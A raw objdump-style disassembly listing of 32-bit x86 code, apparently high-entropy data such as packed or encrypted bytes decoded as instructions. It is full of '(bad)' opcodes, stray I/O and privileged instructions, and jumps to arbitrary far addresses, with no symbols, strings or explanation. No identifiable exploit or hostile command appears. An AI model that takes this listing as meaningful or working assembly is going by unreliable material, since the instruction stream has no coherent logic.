  4262bc:	es call 0xdcbd24d
  4262c2:	cmc    
  4262c3:	xchg   ecx,eax
  4262c4:	xor    cl,ch
  4262c6:	inc    eax
  4262c7:	call   esp
  4262c9:	fisttp DWORD PTR [edx+0x3589788d]
  4262cf:	jmp    0x63dc1e59
  4262d4:	fwait
  4262d5:	or     BYTE PTR [ebx+0x36],al
  4262d8:	sahf   
  4262d9:	sub    bh,BYTE PTR [ecx-0x67]
  4262dc:	and    dl,BYTE PTR [edx]
  4262de:	push   cs
  4262df:	sbb    eax,edx
  4262e1:	les    edi,FWORD PTR [edx]
  4262e3:	out    0xcc,eax
  4262e5:	popa   
  4262e6:	stos   DWORD PTR es:[edi],eax
  4262e7:	imul   edx,DWORD PTR [ecx],0x63
  4262ea:	xchg   ebx,eax
  4262eb:	pop    edx
  4262ec:	in     al,dx
  4262ed:	call   DWORD PTR [edi+0x5c7f5631]
  4262f3:	sbb    al,0xbf
  4262f5:	dec    ebx
  4262f6:	sub    eax,0xfe3b736f
  4262fb:	sbb    edx,DWORD PTR [ebx-0x3f]
  4262fe:	or     eax,0x8a221492
  426303:	sbb    eax,0x52178115
  426308:	xor    ch,dl
  42630a:	cmp    BYTE PTR [esi],dh
  42630c:	cmp    edi,DWORD PTR [esi]
  42630e:	mov    al,ds:0x7df3
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xa47ecb92
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xd6000001
  42638d:	arpl   WORD PTR [ebx-0x46],si
  426390:	pop    ds
  426391:	cmc    
  426392:	idiv   al
  426394:	jecxz  0x4263ff
  426396:	push   esp
  426397:	pop    edx
  426398:	repz test BYTE PTR [eax+0x64],al
  42639c:	jl     0x4263ac
  42639e:	push   es
  42639f:	clc    
  4263a0:	inc    ebx
  4263a1:	xlat   BYTE PTR ds:[ebx]
  4263a2:	pop    es
  4263a3:	jo     0x4263bb
  4263a5:	push   edi
  4263a6:	test   al,0x6
  4263a8:	mov    fs,esp
  4263aa:	int    0xed
  4263ac:	jo     0x4263fa
  4263ae:	or     DWORD PTR [eax+edi*8+0x67ced965],0x27
  4263b6:	aad    0x6b
  4263b8:	jne    0x4263f3
  4263ba:	xchg   esp,eax
  4263bb:	push   esp
  4263bc:	jmp    0xebff9c81
  4263c1:	fadd   DWORD PTR [ebx]
  4263c3:	ja     0x4263c4
  4263c5:	xor    al,0x8b
  4263c7:	leave  
  4263c8:	add    DWORD PTR [ebx-0x7510c3fb],0xffffff9c
  4263cf:	das    
  4263d0:	push   esp
  4263d1:	aas    
  4263d2:	pop    edi
  4263d3:	inc    edx
  4263d4:	dec    edi
  4263d5:	mov    bh,0xe
  4263d7:	jle    0x42641a
  4263d9:	sar    DWORD PTR [esi-0x35],0xe9
  4263dd:	ins    BYTE PTR es:[edi],dx
  4263de:	pop    ebp
  4263df:	dec    ebx
  4263e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263e2:	fs pop edi
  4263e4:	mov    eax,DWORD PTR [edx+0x58a551cb]
  4263ea:	jg     0x4263a2
  4263ec:	test   eax,0xc43d345d
  4263f1:	loop   0x4263bf
  4263f3:	xchg   ebx,eax
  4263f4:	dec    ecx
  4263f5:	pop    ebp
  4263f6:	jnp    0x426424
  4263f8:	aaa    
  4263f9:	and    cl,BYTE PTR [ebx+0x26]
  4263fc:	xchg   BYTE PTR [ebp+0x62],ch
  4263ff:	jne    0x4263a0
  426401:	jge    0x426395
  426403:	js     0x4263b7
  426405:	mov    BYTE PTR [edi+ebx*2],ch
  426408:	sti    
  426409:	jle    0x42645c
  42640b:	popa   
  42640c:	and    DWORD PTR [ecx-0x1d15896e],ecx
  426412:	or     ebp,DWORD PTR ds:0xd774434a
  426418:	sahf   
  426419:	xchg   edx,eax
  42641a:	aaa    
  42641b:	outs   dx,BYTE PTR ds:[esi]
  42641c:	scas   eax,DWORD PTR es:[edi]
  42641d:	push   ebx
  42641e:	(bad)  
  42641f:	jmp    0x4263d4
  426421:	rcr    BYTE PTR [ecx-0x54],1
  426424:	cs gs sub ah,ch
  426428:	and    bh,cl
  42642a:	ficomp WORD PTR [ecx-0x3c]
  42642d:	jge    0x426453
  42642f:	xor    edx,edx
  426431:	lds    eax,FWORD PTR [ebp-0x7c]
  426434:	or     bl,0x29
  426437:	mov    ah,0xc5
  426439:	mov    edi,DWORD PTR [edi+0x4d]
  42643c:	jmp    0x4263c1
  42643e:	add    eax,0xa7e10619
  426443:	xlat   BYTE PTR ds:[ebx]
  426444:	stos   BYTE PTR es:[edi],al
  426445:	faddp  st(0),st
  426447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426448:	stc    
  426449:	sbb    al,0x8f
  42644b:	fs test eax,0x93d15131
  426451:	inc    edx
  426452:	xchg   edx,eax
  426453:	out    dx,eax
  426454:	xchg   ebx,eax
  426455:	ins    DWORD PTR es:[edi],dx
  426456:	mov    fs,WORD PTR [ecx]
  426458:	cmp    BYTE PTR [ebx+ebx*2+0x1b7345f1],dl
  42645f:	xor    al,0x18
  426461:	out    dx,eax
  426462:	call   0xbff4:0x98163930
  426469:	pop    ss
  42646a:	repz mov dl,0x69
  42646d:	xchg   DWORD PTR [edx],eax
  42646f:	add    eax,0xdd2738bf
  426474:	aas    
  426475:	mov    bh,0x42
  426477:	lock ret 0xf67a
  42647b:	sub    bh,BYTE PTR [ebp-0x65]
  42647e:	lods   eax,DWORD PTR ds:[esi]
  42647f:	inc    ebx
  426480:	popf   
  426481:	mov    edx,0xaba2ea67
  426486:	out    0x99,eax
  426488:	pop    ds
  426489:	mov    ch,0xe3
  42648b:	ss stos DWORD PTR es:[edi],eax
  42648d:	add    eax,DWORD PTR [ecx+0xa5ee]
	...
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [edi-0x31],ecx
  426502:	xchg   dh,ch
  426504:	mov    al,0x99
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0x51000001
  42650d:	jmp    0xa0d:0xd4dab125
  426514:	dec    edi
  426515:	loop   0x426533
  426517:	add    DWORD PTR [esi-0x1d],0x45ee5fb1
  42651e:	(bad)  
  42651f:	jno    0x4264ef
  426521:	rol    esi,1
  426523:	push   edi
  426524:	mov    ebp,0xee9b6d0c
  426529:	sbb    cl,bh
  42652b:	sahf   
  42652c:	adc    ch,cl
  42652e:	stos   DWORD PTR es:[edi],eax
  42652f:	xchg   esp,eax
  426530:	je     0x4264dd
  426532:	out    dx,al
  426533:	ss retf 0x46b2
  426537:	jo     0x42658f
  426539:	adc    DWORD PTR [esi],ecx
  42653b:	retf   0xddcc
  42653e:	ins    BYTE PTR es:[edi],dx
  42653f:	xlat   BYTE PTR ds:[ebx]
  426540:	add    esp,ecx
  426542:	cwde   
  426543:	xlat   BYTE PTR ds:[ebx]
  426544:	cmp    DWORD PTR [esi+edx*8+0x1e],0xffffffa1
  426549:	fcom   DWORD PTR [edx]
  42654b:	push   ds
  42654c:	mov    esi,0x202f2b1c
  426551:	xchg   esp,eax
  426552:	mov    esp,0x775a09f0
  426557:	lahf   
  426558:	imul   BYTE PTR [edx+0x5d]
  42655b:	test   DWORD PTR [esp+edx*2+0x18],edx
  42655f:	jbe    0x4265b4
  426561:	and    eax,0x6274c833
  426566:	mov    BYTE PTR [esi-0x4fff8ed3],ch
  42656c:	mov    bh,0x82
  42656e:	dec    esp
  42656f:	ss int 0x9e
  426572:	mov    esp,0x13d3d1
  426577:	jns    0x4265cc
  426579:	loope  0x42652c
  42657b:	mov    eax,0xa316b647
  426580:	aad    0xec
  426582:	dec    edx
  426583:	sub    al,0x2b
  426585:	cdq    
  426586:	xlat   BYTE PTR ds:[ebx]
  426587:	scas   al,BYTE PTR es:[edi]
  426588:	fcmovu st,st(0)
  42658a:	push   ss
  42658b:	cmp    BYTE PTR [ebp+0x25bf1cb],cl
  426591:	ret    0x2bff
  426594:	fsub   QWORD PTR [edi+0x2ea6caa6]
  42659a:	pusha  
  42659b:	xlat   BYTE PTR ds:[ebx]
  42659c:	loope  0x4265b2
  42659e:	ret    0x97ed
  4265a1:	dec    ecx
  4265a2:	(bad)  [eax]
  4265a4:	lea    edi,ds:0x9b018906
  4265aa:	and    BYTE PTR [ecx+0x13],ah
  4265ad:	jno    0x426589
  4265af:	push   edi
  4265b0:	(bad)  
  4265b1:	mov    ebp,0x658f46c1
  4265b6:	fsub   QWORD PTR [ebp+0x6c]
  4265b9:	fstp   st(5)
  4265bb:	dec    eax
  4265bc:	out    dx,al
  4265bd:	arpl   WORD PTR [ebp-0x52b27875],si
  4265c3:	fbld   TBYTE PTR [eax-0x1c]
  4265c6:	cmp    DWORD PTR [edx+0x4b],ecx
  4265c9:	scas   al,BYTE PTR es:[edi]
  4265ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265cb:	push   ebp
  4265cc:	sub    BYTE PTR [esi-0x2a],cl
  4265cf:	aaa    
  4265d0:	lods   al,BYTE PTR ds:[esi]
  4265d1:	pop    es
  4265d2:	les    ebp,FWORD PTR [edx]
  4265d4:	mov    edx,0xe13d1266
  4265d9:	ja     0x4265c4
  4265db:	pushf  
  4265dc:	arpl   WORD PTR [esi],cx
  4265de:	xchg   edx,eax
  4265df:	das    
  4265e0:	jno    0x426636
  4265e2:	fcom   st(1)
  4265e4:	outs   dx,DWORD PTR ds:[esi]
  4265e5:	mov    al,0xcc
  4265e7:	mov    dl,al
  4265e9:	repz inc edx
  4265eb:	push   edx
  4265ec:	retf   
  4265ed:	sbb    eax,0x2bca1e9d
  4265f2:	pop    eax
  4265f3:	fisubr DWORD PTR [eax]
  4265f5:	in     al,dx
  4265f6:	jge    0x426656
  4265f8:	pop    ebx
  4265f9:	inc    edx
  4265fa:	loopne 0x42657c
  4265fc:	out    dx,al
  4265fd:	test   eax,0x323b2486
  426602:	aam    0xa1
  426604:	loop   0x426600
  426606:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  426608:	js     0x4265c8
  42660a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42660b:	adc    al,0xac
  42660d:	in     eax,0xa7
  42660f:	xlat   BYTE PTR ds:[ebx]
  426610:	aam    0x0
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x58f46da4]
  426682:	out    0xd8,al
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0x10000001
  42668d:	push   edi
  42668f:	cmp    BYTE PTR [edi],0x46
  426692:	sub    edx,DWORD PTR [edx+0x55]
  426695:	xchg   esp,eax
  426696:	dec    ecx
  426697:	hlt    
  426698:	imul   ebx,DWORD PTR [ebx-0x24cf4560],0x1003dca
  4266a2:	jnp    0x4266fa
  4266a4:	dec    ebp
  4266a5:	pop    ebx
  4266a6:	loopne 0x4266d7
  4266a8:	test   edx,0x923ae5bf
  4266ae:	pop    eax
  4266af:	arpl   WORD PTR [edx-0x7f],dx
  4266b2:	or     dl,BYTE PTR [esi+0x61]
  4266b5:	shl    ah,1
  4266b7:	into   
  4266b8:	jb     0x42664a
  4266ba:	jg     0x4266e1
  4266bc:	ss add edi,ebp
  4266bf:	push   esi
  4266c0:	xchg   esi,eax
  4266c1:	jbe    0x4266a0
  4266c3:	imul   esi,DWORD PTR [ebp-0x3e],0x39
  4266c7:	mov    BYTE PTR [edi],ch
  4266c9:	shl    DWORD PTR [edx-0x472db36],cl
  4266cf:	pop    ecx
  4266d0:	fcmovnu st,st(2)
  4266d2:	lahf   
  4266d3:	jl     0x426679
  4266d5:	sub    eax,0xffd24112
  4266da:	adc    DWORD PTR [ecx+0xd],edx
  4266dd:	addr16 retf 
  4266df:	int3   
  4266e0:	dec    ecx
  4266e1:	push   es
  4266e2:	mov    ebx,0xb11fbfb9
  4266e7:	mov    DWORD PTR [edi+0x4c],ebp
  4266ea:	xchg   esp,eax
  4266eb:	jge    0x426699
  4266ed:	test   al,0xc3
  4266ef:	repz test eax,0xe3c6ee1d
  4266f5:	es retf 
  4266f7:	jae    0x426708
  4266f9:	jmp    0x42676f
  4266fb:	je     0x426708
  4266fd:	mov    ds:0x749b3ceb,eax
  426702:	lods   al,BYTE PTR ds:[esi]
  426703:	and    BYTE PTR [esp+eax*1-0x4f],cl
  426707:	ja     0x42669b
  426709:	(bad)  
  42670a:	jno    0x42673c
  42670c:	or     DWORD PTR [eax-0x52],ecx
  42670f:	wbinvd 
  426711:	aam    0x3d
  426713:	jo     0x426718
  426715:	retf   
  426716:	repz adc al,0xcd
  426719:	ins    BYTE PTR es:[edi],dx
  42671a:	adc    eax,0xf8dbea22
  42671f:	jns    0x426752
  426721:	push   0x69993217
  426726:	retf   
  426727:	pop    ebp
  426728:	dec    ebp
  426729:	cmp    dh,BYTE PTR [esi]
  42672b:	push   ebx
  42672c:	adc    BYTE PTR [edx+ecx*2-0x27],ch
  426730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426731:	jge    0x426701
  426733:	mov    DWORD PTR [edi+eax*8],ebp
  426736:	adc    al,0xd9
  426738:	fild   DWORD PTR [esi+0x16]
  42673b:	dec    eax
  42673c:	pop    edi
  42673d:	clc    
  42673e:	mov    es,WORD PTR [edx+0x1eaf945b]
  426744:	push   ss
  426745:	mov    DWORD PTR [ebx],eax
  426747:	lods   eax,DWORD PTR ss:[esi]
  426749:	outs   dx,DWORD PTR ds:[esi]
  42674a:	leave  
  42674b:	jp     0x426733
  42674d:	into   
  42674e:	shr    DWORD PTR [esp+ebp*8+0x5e],1
  426752:	sub    DWORD PTR [ecx],edi
  426754:	loop   0x426764
  426756:	leave  
  426757:	inc    esp
  426758:	mov    ds:0x835a70ed,eax
  42675d:	test   DWORD PTR [edx+0x4fd40adc],0x4bac9049
  426767:	out    dx,eax
  426768:	xchg   ecx,eax
  426769:	inc    esi
  42676a:	inc    ebp
  42676b:	xor    al,0xd1
  42676d:	outs   dx,DWORD PTR ds:[esi]
  42676e:	jle    0x4267bb
  426770:	pushf  
  426771:	jnp    0x426700
  426773:	pushf  
  426774:	loopne 0x426701
  426776:	bswap  ecx
  426778:	lods   eax,DWORD PTR ds:[esi]
  426779:	pop    ecx
  42677a:	ins    DWORD PTR es:[edi],dx
  42677b:	rol    DWORD PTR [ebx-0x42],cl
  42677e:	sub    edi,esp
  426780:	iret   
  426781:	mov    ebx,0x5a49a751
  426786:	test   al,0x7
  426788:	cli    
  426789:	xor    al,0x99
  42678b:	int3   
  42678c:	cdq    
  42678d:	(bad)  
  42678e:	bswap  edi
  426790:	je     0x426792
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	push   ebp
  426801:	cwd    
  426803:	lods   al,BYTE PTR ds:[esi]
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    BYTE PTR [ebp+0x6f],cl
  42680e:	mov    ?,WORD PTR [edx]
  426810:	push   es
  426811:	outs   dx,DWORD PTR ds:[esi]
  426812:	cld    
  426813:	lahf   
  426814:	sub    BYTE PTR [eax+ecx*8+0x36],cl
  426818:	cs lahf 
  42681a:	cmp    bh,BYTE PTR [esi-0x13546983]
  426820:	dec    edi
  426821:	sub    bl,BYTE PTR [ecx-0x6f4e5c86]
  426827:	cwde   
  426828:	sbb    esi,DWORD PTR es:[edx-0x2fef3a57]
  42682f:	fcmovnbe st,st(4)
  426831:	mov    cl,0x22
  426833:	mov    ebx,0x634695f5
  426838:	enter  0xfb6b,0x13
  42683c:	inc    edi
  42683d:	mov    ebp,0xdf48a654
  426842:	push   eax
  426843:	jecxz  0x4267ee
  426845:	imul   esp,DWORD PTR [edi+0x4c],0xb010e8e3
  42684c:	inc    eax
  42684d:	push   eax
  42684e:	jmp    0x42681f
  426850:	adc    al,0xa1
  426852:	(bad)  
  426854:	es mov cl,0xe7
  426857:	mov    BYTE PTR [eax+ecx*2-0x4f],dh
  42685b:	cmp    al,0x33
  42685d:	jnp    0x4268a1
  42685f:	mov    edx,0xce84c79
  426864:	sbb    al,0x6
  426866:	or     eax,0x298829ba
  42686b:	sub    al,0xc6
  42686d:	iret   
  42686e:	call   0x9676:0x2fb107ec
  426875:	pushf  
  426876:	fisttp DWORD PTR [eax+ecx*1]
  426879:	and    BYTE PTR [ecx-0x6b],ah
  42687c:	(bad)  
  42687d:	sub    al,0x4b
  42687f:	fadd   DWORD PTR [ebx+eax*4-0x7c]
  426883:	nop
  426884:	mov    ebx,0x7b517bd7
  426889:	mov    edx,0xa8df51c2
  42688e:	xchg   ecx,eax
  42688f:	lahf   
  426890:	jb     0x426849
  426892:	sbb    ecx,DWORD PTR [edi]
  426894:	test   DWORD PTR [ecx-0x1574c98a],edx
  42689a:	scas   eax,DWORD PTR es:[edi]
  42689b:	fstp   QWORD PTR [esi+0x1d]
  42689e:	loope  0x4268f6
  4268a0:	loope  0x4268b0
  4268a2:	jmp    0x51bd:0x5ef984f7
  4268a9:	rcl    ecx,cl
  4268ab:	js     0x426838
  4268ad:	pop    esi
  4268ae:	or     bh,BYTE PTR [eax+0x2e18401e]
  4268b4:	and    bl,BYTE PTR [ebp-0x74720c46]
  4268ba:	add    DWORD PTR [ebp+0x7a1c0893],esp
  4268c0:	inc    esi
  4268c1:	add    eax,0xbbaa6f9
  4268c6:	pop    esp
  4268c7:	jb     0x426869
  4268c9:	rcr    BYTE PTR [ebx+0x36],0xdf
  4268cd:	gs clc 
  4268cf:	scas   eax,DWORD PTR es:[edi]
  4268d0:	pushf  
  4268d1:	xor    ah,bl
  4268d3:	inc    edi
  4268d4:	(bad)
  4268d9:	jmp    0xee3dea3c
  4268de:	sbb    eax,0xdc8648df
  4268e3:	pop    esi
  4268e4:	mov    ebx,0x165b3996
  4268e9:	mov    al,0xcd
  4268eb:	xor    al,0xa2
  4268ed:	mov    ebx,0x15f10a60
  4268f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268f3:	adc    dl,ah
  4268f5:	retf   
  4268f6:	xor    ah,ch
  4268f8:	addr16 jns 0x42693f
  4268fb:	inc    eax
  4268fc:	pusha  
  4268fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268fe:	pop    ds
  4268ff:	push   ebx
  426900:	leave  
  426901:	mov    edi,0xa1c570e8
  426906:	clc    
  426907:	mov    esi,0x7dc0b437
  42690c:	jge    0x4268fa
  42690e:	(bad)  
  42690f:	fwait
  426910:	mov    BYTE PTR [eax],al
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    esi,DWORD PTR [ecx-0x5f]
  426982:	lock aam 0xbf
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0x21000001
  42698d:	icebp  
  42698e:	mov    ?,WORD PTR [edi-0x664c2252]
  426994:	and    edx,DWORD PTR [ecx-0x1f7cc09c]
  42699a:	mov    ds:0xa9daaae5,eax
  42699f:	out    0xde,al
  4269a1:	int    0xf9
  4269a3:	adc    al,dl
  4269a5:	cmp    BYTE PTR [edx],0x9d
  4269a8:	(bad)  [edx]
  4269aa:	sahf   
  4269ab:	push   eax
  4269ac:	push   cs
  4269ad:	and    DWORD PTR [eax-0x1b],0x7e
  4269b1:	mov    ds:0xac7dd28a,al
  4269b6:	mov    al,0xc0
  4269b8:	rol    DWORD PTR [eax+0x2a],1
  4269bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269bc:	je     0x426a2b
  4269be:	js     0x42699b
  4269c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269c1:	pop    es
  4269c2:	out    0x7a,eax
  4269c4:	stc    
  4269c5:	sub    eax,0x948d0a7d
  4269ca:	cwde   
  4269cb:	fbld   TBYTE PTR [edi+0x2fe3f711]
  4269d1:	lods   al,BYTE PTR ds:[esi]
  4269d2:	rcr    DWORD PTR [esp+ebx*1],cl
  4269d5:	pop    ss
  4269d6:	ror    edx,0x3c
  4269d9:	cmp    ecx,0xd11b2d04
  4269df:	cmp    BYTE PTR [ebx-0x78],bl
  4269e2:	pop    ds
  4269e3:	jne    0x426a2e
  4269e5:	cld    
  4269e6:	or     esi,DWORD PTR [edi]
  4269e8:	hlt    
  4269e9:	xchg   ebp,eax
  4269ea:	push   cs
  4269eb:	add    ebx,DWORD PTR [ebx]
  4269ed:	dec    eax
  4269ee:	lahf   
  4269ef:	out    0x7e,eax
  4269f1:	jp     0x426a27
  4269f3:	cwde   
  4269f4:	dec    eax
  4269f5:	mov    eax,gs
  4269f7:	out    0xaa,al
  4269f9:	sbb    eax,ecx
  4269fb:	xchg   ebp,eax
  4269fc:	nop
  4269fd:	jnp    0x426a32
  4269ff:	jmp    0x8765e35f
  426a04:	iret   
  426a05:	xchg   esi,eax
  426a06:	jnp    0x426a49
  426a08:	ss pop es
  426a0a:	div    DWORD PTR [eax]
  426a0c:	leave  
  426a0d:	jg     0x4269a9
  426a0f:	jb     0x4269c7
  426a11:	jecxz  0x4269df
  426a13:	loopne 0x426a12
  426a15:	sbb    bh,ch
  426a17:	adc    dl,BYTE PTR [eax-0x7dcf4eb1]
  426a1d:	cmc    
  426a1e:	push   eax
  426a1f:	data16 jecxz 0x426a12
  426a22:	pop    ds
  426a23:	out    0x28,eax
  426a25:	out    dx,eax
  426a26:	xchg   ecx,eax
  426a27:	clc    
  426a28:	ret    0x2867
  426a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a2c:	jl     0x426a8b
  426a2e:	mov    fs,WORD PTR [esi]
  426a30:	mov    dl,0x3a
  426a32:	jnp    0x426a51
  426a34:	pop    ds
  426a35:	sbb    bl,al
  426a37:	add    ebp,esp
  426a39:	and    al,0x26
  426a3b:	jb     0x426a64
  426a3d:	cmp    ch,BYTE PTR [edi-0x7c1cd00b]
  426a43:	arpl   WORD PTR [esi-0x26c68eef],di
  426a49:	ss inc ebp
  426a4b:	adc    al,0x1f
  426a4d:	int3   
  426a4e:	add    DWORD PTR [edx],edi
  426a50:	add    DWORD PTR [ebx+0x4d],esi
  426a53:	mov    ch,0x71
  426a55:	mov    al,ds:0x1a1a2dc
  426a5a:	push   ecx
  426a5b:	pop    ds
  426a5c:	bound  ebx,QWORD PTR [edx+ebx*8-0x75]
  426a60:	pop    eax
  426a61:	mov    BYTE PTR [eax],dh
  426a63:	mov    ecx,0xfa6833c4
  426a68:	jp     0x426a61
  426a6a:	sbb    BYTE PTR [esi],al
  426a6c:	or     eax,0xe669e4e8
  426a71:	push   esp
  426a72:	ins    BYTE PTR es:[edi],dx
  426a73:	pop    esp
  426a74:	enter  0x43b2,0x81
  426a78:	lods   al,BYTE PTR ds:[esi]
  426a79:	enter  0xb26e,0x8b
  426a7d:	cli    
  426a7e:	jmp    0x681b9d20
  426a83:	fcmovb st,st(1)
  426a85:	mov    ecx,0x2cde0458
  426a8a:	jmp    0xf0e3:0x2fb9020b
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x6d
  426b01:	sbb    al,0x43
  426b03:	jo     0x426ac9
  426b05:	popf   
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0xab000001
  426b0d:	sar    ch,1
  426b0f:	les    edx,FWORD PTR [eax]
  426b11:	or     edx,DWORD PTR [ebp+0x546fd6c2]
  426b17:	cmp    ch,BYTE PTR [esi]
  426b19:	(bad)  
  426b1c:	lods   al,BYTE PTR ds:[esi]
  426b1d:	popa   
  426b1e:	inc    edx
  426b1f:	outs   dx,DWORD PTR ds:[esi]
  426b20:	cs test al,0x8b
  426b23:	mov    ch,0x13
  426b25:	push   esi
  426b26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b27:	sti    
  426b28:	mul    esp
  426b2a:	jb     0x426b8c
  426b2c:	pmullw mm3,QWORD PTR [edi]
  426b2f:	or     esi,esi
  426b31:	loope  0x426bac
  426b33:	cmp    DWORD PTR [ebx+0x75],0xffffffc8
  426b37:	fldcw  WORD PTR [ecx-0x75]
  426b3a:	add    al,0x89
  426b3c:	push   esi
  426b3d:	or     eax,0xe49a24e9
  426b42:	mov    bl,0xfa
  426b44:	cld    
  426b45:	xlat   BYTE PTR ds:[ebx]
  426b46:	jns    0x426b03
  426b48:	or     eax,ebp
  426b4a:	(bad)  
  426b4b:	xor    dh,BYTE PTR [ebp+0xfe22bc1]
  426b51:	or     BYTE PTR [eax+eax*8-0x3f916260],0xae
  426b59:	cld    
  426b5a:	call   ebx
  426b5c:	sete   BYTE PTR [esp-0x34]
  426b61:	sub    al,0x1
  426b63:	add    eax,0x1585d54c
  426b68:	lods   al,BYTE PTR ds:[esi]
  426b69:	shl    cl,1
  426b6b:	xchg   ebp,eax
  426b6c:	js     0x426b6a
  426b6e:	push   ss
  426b6f:	cmp    dh,ch
  426b71:	push   edi
  426b72:	mov    edx,0x33ab7c9f
  426b77:	xchg   esi,eax
  426b78:	sub    DWORD PTR [eax-0x779b74fd],ebp
  426b7e:	inc    esp
  426b7f:	lds    edx,FWORD PTR [esp-0x30]
  426b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b84:	(bad)  
  426b85:	imul   BYTE PTR [ecx]
  426b87:	outs   dx,BYTE PTR ds:[esi]
  426b88:	scas   al,BYTE PTR es:[edi]
  426b89:	push   ecx
  426b8a:	lods   eax,DWORD PTR ds:[esi]
  426b8b:	aam    0x13
  426b8d:	xchg   edx,eax
  426b8e:	dec    ebp
  426b8f:	cmp    eax,DWORD PTR [ebp-0x38]
  426b92:	jns    0x426b55
  426b94:	add    cl,BYTE PTR [eax]
  426b96:	push   ebp
  426b97:	mov    ch,0xc9
  426b99:	ja     0x426bdf
  426b9b:	into   
  426b9c:	dec    edx
  426b9d:	pushf  
  426b9e:	push   ebp
  426b9f:	hlt    
  426ba0:	out    0x90,al
  426ba2:	lahf   
  426ba3:	pop    ecx
  426ba4:	jo     0x426bf2
  426ba6:	pop    es
  426ba7:	das    
  426ba8:	dec    edi
  426ba9:	cmp    DWORD PTR [ecx+0x23a1a5ee],esi
  426baf:	dec    ebx
  426bb0:	sbb    eax,0x49b4485f
  426bb5:	push   0x7f
  426bb7:	jnp    0x426b51
  426bb9:	xor    esi,DWORD PTR [ebx-0x2526644a]
  426bbf:	ss push edi
  426bc1:	loopne 0x426b7d
  426bc3:	jns    0x426bdf
  426bc5:	gs fxam 
  426bc8:	ret    
  426bc9:	xor    al,BYTE PTR [ecx-0x46fd0d5c]
  426bcf:	fnstcw WORD PTR [esi+0x5849edda]
  426bd5:	push   es
  426bd6:	jae    0x426b90
  426bd8:	cmp    ch,cl
  426bda:	push   esi
  426bdb:	aam    0x5c
  426bdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bde:	cmp    DWORD PTR [ecx+edx*1],esi
  426be1:	(bad)
  426be4:	mov    edx,0x15abb86f
  426be9:	mov    ebx,DWORD PTR [edx]
  426beb:	inc    esi
  426bec:	add    ebx,DWORD PTR [ecx-0x21]
  426bef:	shr    ecx,cl
  426bf1:	adc    al,0x9a
  426bf3:	addr16 hlt 
  426bf5:	or     edx,DWORD PTR [ecx+eiz*1]
  426bf8:	inc    esp
  426bf9:	sub    bl,BYTE PTR [ebx+0x1f7265b1]
  426bff:	nop
  426c00:	test   eax,0x809b325
  426c05:	or     eax,0x6d3dea8e
  426c0a:	out    dx,eax
  426c0b:	fisttp WORD PTR [esi+edi*8-0x44]
  426c0f:	inc    ecx
  426c10:	bound  eax,QWORD PTR [eax]
	...
  426c72:	add    BYTE PTR [eax],al
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x3119639d
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x9000001
  426c8d:	(bad)  
  426c8e:	jecxz  0x426ccf
  426c90:	sub    ah,BYTE PTR [esi-0x4411f157]
  426c96:	mov    bl,0x5c
  426c98:	stc    
  426c99:	lods   eax,DWORD PTR ds:[esi]
  426c9a:	xchg   edi,eax
  426c9b:	cmp    BYTE PTR [eax],al
  426c9d:	mov    ds:0xa26c479d,eax
  426ca2:	push   eax
  426ca3:	cmp    DWORD PTR [ebp+ebx*8-0x5b0394],ebx
  426caa:	leave  
  426cab:	lahf   
  426cac:	fwait
  426cad:	in     al,dx
  426cae:	pop    ss
  426caf:	not    BYTE PTR [ebx]
  426cb1:	add    bh,BYTE PTR [ebx+edi*1-0x7e720a2d]
  426cb8:	mov    eax,ds:0x47da07b8
  426cbd:	setae  BYTE PTR [esi]
  426cc0:	ret    
  426cc1:	dec    edx
  426cc2:	add    DWORD PTR [esi],esp
